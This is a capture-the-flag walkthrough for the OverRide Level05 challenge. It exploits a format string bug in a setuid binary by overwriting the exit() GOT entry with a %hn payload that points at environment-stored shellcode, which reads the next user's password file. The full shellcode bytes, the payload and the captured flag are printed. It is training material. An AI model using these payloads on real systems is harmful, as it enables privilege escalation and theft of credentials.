# Level05

## Walkthrough

We list the files in the current home directory.

```bash
level05@OverRide:~$ ls -lA
total 17
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
level05@OverRide:~$ file level05 
level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not stripped
```

The file `level05` is owned by **level06** and has the setuid bit.

We list the functions inside the executable.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

There is 1 user-defined function: `main()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     push   edi
   0x08048448 <+4>:     push   ebx
   0x08048449 <+5>:     and    esp,0xfffffff0
   0x0804844c <+8>:     sub    esp,0x90
   0x08048452 <+14>:    mov    DWORD PTR [esp+0x8c],0x0
   0x0804845d <+25>:    mov    eax,ds:0x80497f0
   0x08048462 <+30>:    mov    DWORD PTR [esp+0x8],eax
   0x08048466 <+34>:    mov    DWORD PTR [esp+0x4],0x64
   0x0804846e <+42>:    lea    eax,[esp+0x28]
   0x08048472 <+46>:    mov    DWORD PTR [esp],eax
   0x08048475 <+49>:    call   0x8048350 <fgets@plt>
   0x0804847a <+54>:    mov    DWORD PTR [esp+0x8c],0x0
   0x08048485 <+65>:    jmp    0x80484d3 <main+143>
   0x08048487 <+67>:    lea    eax,[esp+0x28]
   0x0804848b <+71>:    add    eax,DWORD PTR [esp+0x8c]
   0x08048492 <+78>:    movzx  eax,BYTE PTR [eax]
   0x08048495 <+81>:    cmp    al,0x40
   0x08048497 <+83>:    jle    0x80484cb <main+135>
   0x08048499 <+85>:    lea    eax,[esp+0x28]
   0x0804849d <+89>:    add    eax,DWORD PTR [esp+0x8c]
   0x080484a4 <+96>:    movzx  eax,BYTE PTR [eax]
   0x080484a7 <+99>:    cmp    al,0x5a
   0x080484a9 <+101>:   jg     0x80484cb <main+135>
   0x080484ab <+103>:   lea    eax,[esp+0x28]
   0x080484af <+107>:   add    eax,DWORD PTR [esp+0x8c]
   0x080484b6 <+114>:   movzx  eax,BYTE PTR [eax]
   0x080484b9 <+117>:   mov    edx,eax
   0x080484bb <+119>:   xor    edx,0x20
   0x080484be <+122>:   lea    eax,[esp+0x28]
   0x080484c2 <+126>:   add    eax,DWORD PTR [esp+0x8c]
   0x080484c9 <+133>:   mov    BYTE PTR [eax],dl
   0x080484cb <+135>:   add    DWORD PTR [esp+0x8c],0x1
   0x080484d3 <+143>:   mov    ebx,DWORD PTR [esp+0x8c]
   0x080484da <+150>:   lea    eax,[esp+0x28]
   0x080484de <+154>:   mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080484e6 <+162>:   mov    edx,eax
   0x080484e8 <+164>:   mov    eax,0x0
   0x080484ed <+169>:   mov    ecx,DWORD PTR [esp+0x1c]
   0x080484f1 <+173>:   mov    edi,edx
   0x080484f3 <+175>:   repnz scas al,BYTE PTR es:[edi]
   0x080484f5 <+177>:   mov    eax,ecx
   0x080484f7 <+179>:   not    eax
   0x080484f9 <+181>:   sub    eax,0x1
   0x080484fc <+184>:   cmp    ebx,eax
   0x080484fe <+186>:   jb     0x8048487 <main+67>
   0x08048500 <+188>:   lea    eax,[esp+0x28]
   0x08048504 <+192>:   mov    DWORD PTR [esp],eax
   0x08048507 <+195>:   call   0x8048340 <printf@plt>
   0x0804850c <+200>:   mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:   call   0x8048370 <exit@plt>
End of assembler dump.
```

The `main()` function:
- calls `fgets()` to read up to 100 bytes from stdin, and stores user input in `[esp + 0x28]`
- calls `printf()` with previous user input stored in `[esp + 0x28]`
- calls `exit()` to quit the program

From our previous analysis and our experience from the previous levels and projects, we notice that we can exploit a **format string vulnerability** with `fgets()` and `printf()` in order to replace the address of `exit()` in the GOT with our own shellcode.

We also download the executable and upload it on **Dogbolt** in order to better understand the remaining assembly instructions.

[Link to the decompiled executable](https://dogbolt.org/?id=061a1527-1288-4c44-8fe6-bc482323508f)

The only interesting piece of code is the following one: it teaches us that any uppercase character written on stdin will be transformed to lowercase.

```c
for ( i = 0; i < strlen(s); ++i )
  {
    if ( s[i] > 64 && s[i] <= 90 )
      s[i] ^= 0x20u;
  }
```

First we export our shellcode which is gonna read the `.pass` in the home directory of the `level06` user. We input some NOP characters before it to ensure our shellcode will be executed.

```bash
level05@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff" + "/home/users/level06/.pass"')
```

Then we have to find the address of our shellcode using a simple C program.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
  printf("%p\n", getenv("SHELLCODE"));
  return 0;
}
```

```bash
level05@OverRide:~$ cd /tmp/
level05@OverRide:/tmp$ mkdir getenv
level05@OverRide:/tmp$ cd getenv/
level05@OverRide:/tmp/getenv$ vim main.c
level05@OverRide:/tmp/getenv$ gcc -m32 main.c 
level05@OverRide:/tmp/getenv$ ./a.out 
0xffffd443
```

Our shellcode is located at `0xffffd443`, but because we are aiming for a NOP character, we will increment it by 64 bytes for example: `0xffffd483`.

Finally, we find the address of `exit()` in the GOT.

```
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:     push   0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

The address we are looking for is `0x80497e0`.

Now that we have all the information in hand in order to complete this level, we still need to resolve a last problem: we may not be able to write `0xffffd483` (`4294956163`) characters on stdin with `printf()`...  
Thankfully a solution exists to avoid printing too many bytes in a `printf()` call: treat the 4 bytes address 2 bytes at a time with the `%hn` format specifier.  
The address `0xffffd483` can be represented as `0xffff` and `0xd483`.

Two details to bear in mind before writing our solution:
- memory words are stored in little-endian on our machine, therefore we have to store `0xffff` in `0x80497e2` and `0xd483` in `0x80497e0`
- the second `%hn` specifier will count the bytes already written from the previous one so we have to write the smallest value first

The first value to write is: 54403 (`0xd483`) - 8 (the bytes from the addresses written in first position) = 54395.
The second value to write is: 65535 (`0xffff`) - 54403 = 11132.

```bash
level05@OverRide:~$ python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54395x" + "%10$hn" + "%11132x" + "%11$hn")' | ./level05
# [...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## Resources

- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings)
- [Format-String Vulnerability](https://fengweiz.github.io/20fa-cs315/labs/lab3-slides-format-string.pdf)
- [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)
